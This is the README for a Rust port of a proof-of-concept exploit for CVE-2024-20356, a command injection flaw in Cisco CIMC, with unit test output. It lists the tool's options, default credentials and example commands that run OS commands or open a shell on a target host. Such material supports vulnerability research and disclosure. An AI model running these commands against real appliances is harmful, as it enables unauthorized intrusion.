# CVE-2024-20356
This is a proof of concept for CVE-2024-20356, a Command Injection vulnerability in Cisco's CIMC.

Written by Aaron and Oxidised by SherllyNeo

Full technical details can be found at [https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom](https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom)

## Usage
```bash
Usage: CVE_2024_20356 [OPTIONS] --host <HOSTNAME>

Options:
  -t, --host <HOSTNAME>      Target hostname or IP address (format 10.0.0.1 or 10.0.0.2:1337)
  -u, --username <USERNAME>  Username [default: admin]
  -p, --password <PASSWORD>  Password [default: cisco]
  -a, --action <ACTION>      Action to perform [default: test] [possible values: test, cmd, shell, dance]
  -c, --cmd <CMD>            OS command to run [default: None]
  -v, --verbose              Displays more information about cimc
  -h, --help                 Print help
  -V, --version              Print version
```

Example commands:
```bash
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -v
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -c 'id'
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -a shell
CVE_2024_20356 --host 192.168.x.x -u admin -p your_password -a dance
```

Use the `--help` argument for full usage instructions.

## Disclaimer
This proof-of-concept is for demonstration purposes and should not be used for illegal activities. LRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.
Don't be evil

## Tests
I wrote this without access to the server based on the [original code base](https://github.com/nettitude/CVE-2024-20356/blob/main/CVE-2024-20356.py).

Due to this I wrote extensive unit tests to ensure that the encryption functions match up with those found in the original.
That the login method works using a mock server.
That the arguement parsing works for IP addresses.

to run these tests, use cargo --test
```bash
cargo test 
   Compiling CVE_2024_20356 v0.1.0 
    Finished `test` profile [unoptimized + debuginfo] target(s) in 2.27s 
     Running unittests src/main.rs (target/debug/deps/CVE_2024_20356-6d8ec478cd93405b) 
running 8 tests 
test libs::encryption::tests::pad_test ... ok 
test libs::encryption::tests::key_fnv32_test ... ok 
test libs::encryption::tests::aes_encrypt_test ... ok 
test libs::encryption::tests::derive_key_and_iv_test ... ok 
test libs::encryption::tests::hash_fnv32_test ... ok 
test libs::encryption::tests::encrypt_test ... ok 
test libs::actions::tests::login_test ... ok 
test libs::arguments::validate_hostname_test ... ok 
test result: ok. 8 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.02s 

```


